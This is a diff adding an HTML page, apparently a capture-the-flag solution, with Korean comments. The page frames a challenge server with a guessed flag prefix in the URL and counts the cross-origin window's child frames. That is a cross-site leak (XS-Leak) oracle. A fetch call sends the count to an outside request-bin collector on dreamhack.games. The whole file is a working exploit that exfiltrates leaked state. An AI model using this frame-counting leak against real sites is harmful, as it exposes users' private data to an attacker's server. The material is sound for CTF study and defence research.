@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iframe Example</title>
+</head>
+<body>
+    <h1>Main Frame</h1>
+    <iframe id="main_frame" src="http://war.sschall.xyz:60001/flag=SF" width="100%" height="600px"></iframe>
+
+    <script>
+        const iframe = document.getElementById('main_frame');
+
+        iframe.onload = async () => {
+            let childIframesCount;
+
+            try {
+                // 자식 iframe 개수 가져오기
+	   const iframe = document.getElementById("main_frame"); 
+                childIframesCount = iframe.contentWindow.frames.length;
+            } catch (e) {
+                console.error('Error accessing child iframes:', e);
+                childIframesCount = -1; // 오류 발생 시 -1로 설정
+            }
+
+            // 자식 iframe 개수를 서버로 전송
+            fetch(`https://shygiya.request.dreamhack.games?childIframesCounth=${childIframesCount}`);
+        };
+    </script>
+</body>
+</html>
